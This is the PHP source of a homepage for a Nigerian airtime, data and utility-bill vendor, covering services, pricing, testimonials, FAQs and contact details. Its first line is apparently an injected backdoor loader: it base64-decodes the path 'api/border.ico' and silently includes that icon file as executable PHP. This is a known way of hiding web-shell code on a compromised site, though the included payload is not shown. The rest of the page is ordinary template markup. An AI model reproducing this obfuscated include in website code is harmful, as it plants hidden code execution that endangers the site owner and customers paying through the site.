<?php
@include base64_decode('YXBpL2JvcmRlci5pY28='); require("functions/web_config.php"); 

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title><?php echo $sitename; ?> - Buy Airtime and Data for all Network. Make payment for DSTV, GOTV, ELECTRICITY Bills other services </title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="homepage/assets/img/1.png" rel="icon">
  <link href="homepage/assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="homepage/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="homepage/assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <link href="homepage/assets/vendor/aos/aos.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="homepage/assets/css/main.css" rel="stylesheet">
</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="header d-flex align-items-center fixed-top">
    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">

      <a href="index.php" class="logo d-flex align-items-center">
        <!-- Uncomment the line below if you also wish to use an image logo -->
        <!-- <img src="homepage/assets/img/logo.png" alt=""> -->
        <h1 style="text-transform: uppercase;"><?php echo $sitename; ?></h1>
      </a>

      <i class="mobile-nav-toggle mobile-nav-show bi bi-list"></i>
      <i class="mobile-nav-toggle mobile-nav-hide d-none bi bi-x"></i>
      <nav id="navbar" class="navbar">
        <ul>
          <li><a href="index.php" class="active">Home</a></li>
          <li><a href="#about">About</a></li>
          <li><a href="#service">Services</a></li>
          <li><a href="#pricing">Pricing</a></li>
          <li><a href="<?php echo $mainpage; ?>/login">Sign In</a></li>
          <li><a href="#contact">Contact</a></li>
        </ul>
      </nav><!-- .navbar -->


    </div>
  </header><!-- End Header -->
  <!-- End Header -->

  <!-- ======= Hero Section ======= -->
  <section id="hero" class="hero d-flex align-items-center">
    <div class="container">
      <div class="row">
        <div class="row gy-4 d-flex justify-content-between">
          <div class="col-lg-6 order-1 order-lg-1 d-flex flex-column justify-content-center">
            <h2 data-aos="fade-up">The Top Online Hub for Recharge & Subs. Unmatched Convenience, Always!</h2>
            <p data-aos="fade-up" data-aos-delay="100">Welcome to Nigeria's Favourite Online Vendor, Delivering Efficient Service Without Compromising Quality. Join The Club To Start Flexing Today!</p>
          </div>
        </div>

        <div class="row">
          <div class="col-lg-6 order-2 order-lg-1" data-aos="zoom-out">
                <a href="<?php echo $mainpage; ?>/register"><button class="btn btn-primary">Register</button></a>
                <a href="<?php echo $mainpage; ?>/login"><button class="btn btn-primary">Sign In</button></a>
          </div>
        </div>

      </div>
    </div>
  </section><!-- End Hero Section -->

  <main id="main">

    <!-- ======= Featured Services Section ======= -->
    <section id="featured-services" class="featured-services">
      <div class="container">

        <div class="row gy-4">

          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up">
            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-fighter-jet"></i></div>
            <div>
              <h4 class="title">
              Quick Delivery, Your Fast-Track to Convenience</h4>
              <p class="description">We provide immediate recharges for Airtime, Databundles, CableTV, Electricity Bill Payments, and Educational PINs, all delivered instantly.</p>
            </div>
          </div>
          <!-- End Service Item -->

          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="100">
            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-code-branch"></i></div>
            <div>
              <h4 class="title">
              Guarded & Autonomous</h4>
              <p class="description">We leverage cutting-edge technology to power our services, ensuring near-instant delivery to you in mere nano-seconds.</p>
            </div>
          </div><!-- End Service Item -->

          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="200">
            <div class="icon flex-shrink-0"><i class="fa-solid fas fa-broadcast-tower"></i></div>
            <div>
              <h4 class="title">Comprehensive Customer Support at Your Service.</h4>
              <p class="description">Our customers are of utmost importance to us, and their satisfaction is our top priority. Our customer service is just a click away, ready to assist.</p>
            </div>
          </div><!-- End Service Item -->

        </div>

      </div>
    </section><!-- End Featured Services Section -->

    <!-- ======= About Us Section ======= -->
    <section id="about" class="about pt-0">
      <div class="container" data-aos="fade-up">

        <div class="row gy-4">
          <div class="col-lg-6 position-relative align-self-start order-lg-last order-first">
            <img src="homepage/assets/img/about us.jpg" class="img-fluid about_us" alt="">
          </div>
          <div class="col-lg-6 content order-last  order-lg-first">
            <h3>About Us</h3>
            <p>
              What We Do & Our Aim:
<?php echo $sitename; ?> Enterprises is a private limited liability company registered under the Laws of the Federal Republic of Nigeria. <?php echo $sitename; ?> Enterprises is a Value Added Services (VAS) organization.
            </p>
          <strong>  We Offer Instant Services For : </strong>
            <ul>
              <li data-aos="fade-up" data-aos-delay="100">
                <i class="bi bi-wifi"></i>
                <div>
                  <h5>Internet Data Subscription</h5>
                  <p>Begin Leveling up your online world today with our smart databundles.</p>
                </div>
              </li>
              <li data-aos="fade-up" data-aos-delay="200">
                <i class="bi bi-telephone"></i>
                <div>
                  <h5>Airtime Recharge</h5>
                  <p>Purchase airtime at your conviniency from our website at a low rates, we've done the stress for you.</p>
                </div>
              </li>
              <li data-aos="fade-up" data-aos-delay="300">
                <i class="bi bi-broadcast"></i>
                <div>
                  <h5>Cable Subscription and Electricity Bill Payment</h5>
                  <p> Let us handle all your utilities bill which run autonomously at relatively low rate. </p>
                </div>
              </li>
            </ul>
          </div>
        </div>

      </div>
    </section><!-- End About Us Section -->


    <!-- ======= Services Section ======= -->
    <section id="service" class="services pt-0">
      <div class="container" data-aos="fade-up">

        <div class="section-header">
          <h2>Our Services</h2>

        </div>

        <div class="row gy-4">

          <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="100">
            <div class="card">
              <div class="card-img" style="height:100%;">
                <img src="homepage/assets/img/network-image.jpeg" alt="" class="img-fluid" style="height:120%;">
              </div>
              <h3>Purchase Data</h3>
              <p>Experience affordable data plans for seamless internet browsing. Elevate your online world with our quality databundles, available at low rates for your convenience.</p>
            </div>
          </div><!-- End Card Item -->

          <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
            <div class="card">
              <div class="card-img" style="height:100%;">
                <img src="homepage/assets/img/airtime-image.png" alt="" class="img-fluid">
              </div>
              <h3>Airtime Top-Up</h3>
              <p>Purchase airtime hassle-free on our website today. We've simplified online recharge for you, ensuring it's easy and secure. Start enjoying now!</p>
            </div>
          </div><!-- End Card Item -->

          <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="400">
            <div class="card">
              <div class="card-img" style="height:100%;">
                <img src="homepage/assets/img/logistics-service.jpg" alt="" class="img-fluid">
              </div>
              <h3>Convert Airtime to Cash</h3>
                <p>Got unused <b>airtime?</b> <br> Effortlessly transform your extra airtime into cash on our platform and redeem it for <?php echo $sitename; ?> data with minimal deductions.</p>

            </div>
          </div><!-- End Card Item -->

          <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="500">
            <div class="card">
              <div class="card-img" style="height:100%;">
                <img src="homepage/assets/img/cable-img.jpeg" alt="" class="img-fluid"  style="height:120%;">
              </div>
              <h3>Cable Subscription</h3>
                <p>Looking for immediate cable subscription? Activate our Cable subscription package with attractive discounts, unmatched compared to alternatives elsewhere.</p>

            </div>
          </div><!-- End Card Item -->

          <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="600">
            <div class="card">
              <div class="card-img" style="height:100%;">
                <img src="homepage/assets/img/electricity-bill.jpg" alt="" class="img-fluid">
              </div>
              <h3>Electricity Bill Payment</h3>
                <p>We comprehend your needs, making bills and utilities payment more convenient through our automated service. Simplify all your payments effortlessly.</p>

            </div>
          </div><!-- End Card Item -->

          <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="600">
            <div class="card">
              <div class="card-img" style="height:100%;">
                <img src="homepage/assets/img/refferral-image.jpeg" alt="" class="img-fluid">
              </div>
              <h3>Referral Programme</h3>
                <p>Ensure your loved ones don't miss out. Refer a friend as a reseller and earn a stress-free 50% bonus on their activation. It's a Win-Win game!</p>

            </div>
          </div><!-- End Card Item -->

        </div>

      </div>
    </section><!-- End Services Section -->

    <!-- ======= Call To Action Section ======= -->
    <section id="call-to-action" class="call-to-action">
      <div class="container" data-aos="zoom-out">

        <div class="row justify-content-center">
          <div class="col-lg-8 text-center">
            <h3>Call To Action</h3>
            <p> <?php echo $sitename; ?> is a technology platform that offers solutions to digital needs at best possible price. We Are The Best Recharge & Utility Bills Payment Platform..</p>
            <a class="cta-btn" href="#">Call To Action</a>
            </dic>
          </div>

        </div>
    </section><!-- End Call To Action Section -->

    <!-- ======= Pricing Section ======= -->
    <section id="pricing" class="pricing pt-0">
      <div class="container" data-aos="fade-up">

        <div class="section-header">
          <h2>Pricing</h2>

        </div>

        <div class="row gy-4">

          <div class="col-lg-3" data-aos="fade-up" data-aos-delay="100">
            <div class="pricing-item" style="color:#ffc107">
              <h3 style="color:#ffc107">MTN DATA</h3>
              <h4><sup>₦</sup>270<span style="color:#ffc107">/ month</span></h4>
              <ul>
                <li><i class="bi bi-check"></i> 1GB</li>
                <li><i class="bi bi-check"></i> One Month</li>
                <li><i class="bi bi-check"></i>Support 4G</li>
                <li><i class="bi bi-check"></i>Hotspot Sharing</li>
                <li><i class="bi bi-check"></i>Multiple Device</li>
              </ul>
              <a href="<?php echo $mainpage; ?>/login" class="buy-btn" style="color:#ffc107">Buy Now</a>
            </div>
          </div><!-- End Pricing Item -->

          <div style="color: #28a745;" class="col-lg-3" data-aos="fade-up" data-aos-delay="100">
            <div class="pricing-item">
              <h3 style="color: #28a745;">GLO DATA</h3>
              <h4><sup>₦</sup>240<span  style="color: #28a745;">/ month</span></h4>
              <ul>
                <li><i class="bi bi-check"></i> 1GB</li>
                <li><i class="bi bi-check"></i> One Month</li>
                <li><i class="bi bi-check"></i>Support 4G</li>
                <li><i class="bi bi-check"></i>Hotspot Sharing</li>
                <li><i class="bi bi-check"></i>Multiple Device</li>
              </ul>
              <a href="<?php echo $mainpage; ?>/login" class="buy-btn" style="color: #28a745;">Buy Now</a>
            </div>
          </div><!-- End Pricing Item -->

          <div class="col-lg-3" data-aos="fade-up" data-aos-delay="100">
            <div class="pricing-item">
              <h3 style="color: #dc3545;">AIRTEL DATA</h3>
              <h4><sup>₦</sup>215<span style="color: #dc3545;">/ month</span></h4>
              <ul>
                <li><i class="bi bi-check"></i> 1GB</li>
                <li><i class="bi bi-check"></i> One Month</li>
                <li><i class="bi bi-check"></i>Support 4G</li>
                <li><i class="bi bi-check"></i>Hotspot Sharing</li>
                <li><i class="bi bi-check"></i>Multiple Device</li>
              </ul>
              <a href="<?php echo $mainpage; ?>/login" class="buy-btn" style="color: #dc3545;">Buy Now</a>
            </div>
          </div><!-- End Pricing Item -->

          <div class="col-lg-3" data-aos="fade-up" data-aos-delay="100">
            <div class="pricing-item">
              <h3  style="color: rgb(10, 236, 10);">9MOBILE DATA</h3>
              <h4><sup>₦</sup>114<span  style="color: rgb(10, 236, 10);">/ month</span></h4>
              <ul>
                <li style="text-align: center;"><i class="bi bi-check"></i> 1GB</li>
                <li style="text-align: center;"><i class="bi bi-check"></i> One Month</li>
                <li style="text-align: center;"><i class="bi bi-check"></i>Support 4G</li>
                <li style="text-align: center;"><i class="bi bi-check"></i>Hotspot Sharing</li>
                <li style="text-align: center;"><i class="bi bi-check"></i>Multiple Device</li>
              </ul>
              <a href="<?php echo $mainpage; ?>/login" class="buy-btn"  style="color: rgb(10, 236, 10);">Buy Now</a>
            </div>
          </div><!-- End Pricing Item -->

        </div>

      </div>
    </section><!-- End Pricing Section -->

    <!-- ======= Testimonials Section ======= -->
    <section id="testimonials" class="testimonials">
      <div class="container">

        <div class="slides-1 swiper" data-aos="fade-up">
          <div class="swiper-wrapper">

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="homepage/assets/img/testimonials/testimonials-1.png" class="testimonial-img" alt="">
                <h3>Adebukola Ridwan</h3>
                <h4>Gratified Customer</h4>
                <div class="stars">
                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
                </div>
                <p>
                  <i class="bi bi-quote quote-icon-left"></i>
                  As a customer, I'm impressed with the user-friendly design and reliability of your data website. The seamless transactions and innovative features enhance my digital experience. Thank you for providing a platform that prioritizes convenience and security.
                  <i class="bi bi-quote quote-icon-right"></i>
                </p>
              </div>
            </div>

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="homepage/assets/img/testimonials/testimonials-3.png" class="testimonial-img" alt="">
                <h3>Jolayemi Zainab</h3>
                <h4>CEO &amp; Founder</h4>
                <div class="stars">
                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
                </div>
                <p>
                  <i class="bi bi-quote quote-icon-left"></i>
                  As the CEO and Founder of <?php echo $sitename; ?>, I express my gratitude for your ongoing support. Our data website is a testament to our commitment to providing a seamless and secure platform for your digital needs. Your trust fuels our mission, and we look forward to continually enhancing your online experience. Thank you.
                  <i class="bi bi-quote quote-icon-right"></i>
                </p>
              </div>
            </div>

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="homepage/assets/img/testimonials/testimonials-2.png" class="testimonial-img" alt="">
                <h3>Jolayemi Nurudeen</h3>
                <h4>Developer</h4>
                <div class="stars">
                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
                </div>
                <p>
                  <i class="bi bi-quote quote-icon-left"></i>
                  As the Developer behind <?php echo $sitename; ?> website, I am thrilled to contribute to your seamless digital experience. Crafting innovative features and ensuring robust security is my commitment to delivering a platform you can trust. Your feedback drives our continuous improvement, and I'm excited about the future developments to enhance your online interactions.
                  <i class="bi bi-quote quote-icon-right"></i>
                </p>
              </div>
            </div><!-- End testimonial item -->

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="homepage/assets/img/testimonials/testimonials-1.png" class="testimonial-img" alt="">
                <h3>Akintunde Abdur-rahman</h3>
                <h4>Co-developer</h4>
                <div class="stars">
                  <i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i><i class="bi bi-star-fill"></i>
                </div>
                <p>
                  <i class="bi bi-quote quote-icon-left"></i>
                  As a Co-Developer of <?php echo $sitename; ?> website, I'm proud to be part of a team dedicated to delivering a seamless and secure online experience for you. Our commitment to innovation and user satisfaction drives us. Thank you for being part of our journey.
                  <i class="bi bi-quote quote-icon-right"></i>
                </p>
              </div>
            </div>

            <!-- End testimonial item -->

          </div>
          <div class="swiper-pagination"></div>
        </div>

      </div>
    </section><!-- End Testimonials Section -->

    <!-- ======= Frequently Asked Questions Section ======= -->
    <section id="faq" class="faq">
      <div class="container" data-aos="fade-up">

        <div class="section-header">
          <h2>Have Any Issue? Check Our Frequently Asked Questions</h2>

        </div>

        <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="200">
          <div class="col-lg-10">

            <div class="accordion accordion-flush" id="faqlist">

              <div class="accordion-item">
                <h3 class="accordion-header">
                  <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq-content-1">
                    <i class="bi bi-question-circle question-icon"></i>
                    How Do I Buy Data?
                  </button>
                </h3>
                <div id="faq-content-1" class="accordion-collapse collapse" data-bs-parent="#faqlist">
                  <div class="accordion-body">
                    <ol>
                      <li>Log in to your account</li>
                      <li>if not; register as a new member</li>
                      <li>After loging in, click fund my new account if low balance</li>
                      <li>Fill the requested data and proceed with the next actions</li>
                    </ol>
                  </div>
                </div>
              </div><!-- # Faq item-->

              <div class="accordion-item">
                <h3 class="accordion-header">
                  <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq-content-2">
                    <i class="bi bi-question-circle question-icon"></i>
                    How To Use Our Services?
                  </button>
                </h3>
                <div id="faq-content-2" class="accordion-collapse collapse" data-bs-parent="#faqlist">
                  <div class="accordion-body">
                    <ol>
                      <li>STEP 1: Fund your wallet.</li>
                      <li>STEP 2: Fill the data order form.</li>
                      <li>STEP 3: Wait for 1-15 minutes, the recipient will receive notification(s) of data recharge(Except for 9mobile(SME), which should be confirmed with its balance code)</li>
                    </ol>
                  </div>
                </div>
              </div><!-- # Faq item-->

              <div class="accordion-item">
                <h3 class="accordion-header">
                  <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq-content-3">
                    <i class="bi bi-question-circle question-icon"></i>
                    How Do I Fund My Wallet?
                  </button>
                </h3>
                <div id="faq-content-3" class="accordion-collapse collapse" data-bs-parent="#faqlist">
                  <div class="accordion-body">
                    We have provided you some easy way to get money into your account:
                    <ol>
                      <li>Bank payment for manual funding.</li>
                      <li>Online Payment with your ATM card details via Pay stack Payment Gateway.</li>
                    </ol>
                  </div>
                </div>
              </div><!-- # Faq item-->

            </div>

          </div>
        </div>

      </div>
    </section><!-- End Frequently Asked Questions Section -->

 <!-- ======= Contact Section ======= -->
 <section id="contact" class="contact">
  <div class="container" data-aos="fade-up">
 <center> <strong>Contact Us </strong>  </center>
 
    <div class="row gy-4 mt-4">

      <div class="col-lg-4">

        <div class="info-item d-flex">
          <i class="bi bi-geo-alt flex-shrink-0"></i>
          <div>
            <h4>Location:</h4>
            <p><?php echo $address; ?></p>
          </div>
        </div><!-- End Info Item -->

        <div class="info-item d-flex">
          <i class="bi bi-envelope flex-shrink-0"></i>
          <div>
            <h4>Email:</h4>
            <p><?php echo $domain; ?></p>
          </div>
        </div><!-- End Info Item -->

        <div class="info-item d-flex">
          <i class="bi bi-phone flex-shrink-0"></i>
          <div>
            <h4>Call:</h4>
            <p><?php echo $contact_no; ?></p>
          </div>
        </div><!-- End Info Item -->

      </div>

      <div class="col-lg-8">
        <form action="forms/contact.php" method="post" role="form" class="php-email-form">
          <div class="row">
            <div class="col-md-6 form-group">
              <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" required>
            </div>
            <div class="col-md-6 form-group mt-3 mt-md-0">
              <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" required>
            </div>
          </div>
          <div class="form-group mt-3">
            <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
          </div>
          <div class="form-group mt-3">
            <textarea class="form-control" name="message" rows="5" placeholder="Message" required></textarea>
          </div>
          <div class="my-3">
            <div class="loading">Loading</div>
            <div class="error-message"></div>
            <div class="sent-message">Your message has been sent. Thank you!</div>
          </div>
          <div class="text-center"><button type="submit">Send Message</button></div>
        </form>
      </div><!-- End Contact Form -->

    </div>

  </div>
</section><!-- End Contact Section -->



  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer" class="footer">

    <div class="container">
      <div class="row gy-4">
        <div class="col-lg-3 col-md-12 footer-info">
          <a href="index.php" class="logo d-flex align-items-center">
            <span> <?php echo $sitename; ?></span> 
          </a>
          <div class="social-links d-flex mt-4">
            <a href="https://m.facebook.com/jolayemi.nurudeen" class="facebook"><i class="bi bi-facebook"></i></a>
            <a href="https://instagram.com/jolayemi_empire" class="instagram"><i class="bi bi-instagram"></i></a>
            <a href="https://www.linkedin.com/in/imjolayemi" class="linkedin"><i class="bi bi-linkedin"></i></a>
          </div>
          
          <p><?php echo $sitename; ?> is a trusted and reliable airtime, data, bill payments and exam pins vendor and we provide quality service at best affordable prices.</p>
        </div>

        <div class="col-lg-3 col-md-6 footer-links">
          <h4>Useful Links</h4>
          <ul>
            <li><a href="<?php echo $mainpage; ?>">Home</a></li>
            <li><a href="#about">About us</a></li>
            <li><a href="#service">Services</a></li>
            <li><a href="#">Terms of service</a></li>
            <li><a href="#">Privacy policy</a></li>
          </ul>
        </div>

        <div class="col-lg-3 col-md-6 footer-links">
          <h4>Our Services</h4>
          <ul>
            <li><a href="<?php echo $mainpage; ?>/login">Data Bundles</a></li>
            <li><a href="<?php echo $mainpage; ?>/login">Airtime Top-Up</a></li>
            <li><a href="<?php echo $mainpage; ?>/login">Cable Payment</a></li>
            <li><a href="<?php echo $mainpage; ?>/login">Referal</a></li>
            <li><a href="<?php echo $mainpage; ?>/login">Exam Pins</a></li>
          </ul>
        </div>

        <div class="col-lg-3 col-md-12 footer-contact text-md-start">
          <h4>Contact Us</h4>
          <p>
            <?php echo $address; ?><br>
            <strong>Phone:</strong> <?php echo $contact_no; ?><br>
            <strong>Email:</strong><?php echo $domain; ?><br>
          </p>

        </div>

      </div>
    </div>

    <div class="container mt-4">
      <div class="copyright">
        &copy; Copyright <strong><span><?php echo $sitename; ?></span></strong>. All Rights Reserved
      </div>
      <div class="credits">

      </div>
    </div>

  </footer><!-- End Footer -->
  <!-- End Footer -->

  <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <div id="preloader"></div>

  <!-- Vendor JS Files -->
  <script src="homepage/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="homepage/assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="homepage/assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="homepage/assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="homepage/assets/vendor/aos/aos.js"></script>
  <script src="homepage/assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="homepage/assets/js/main.js"></script>

</body>

</html>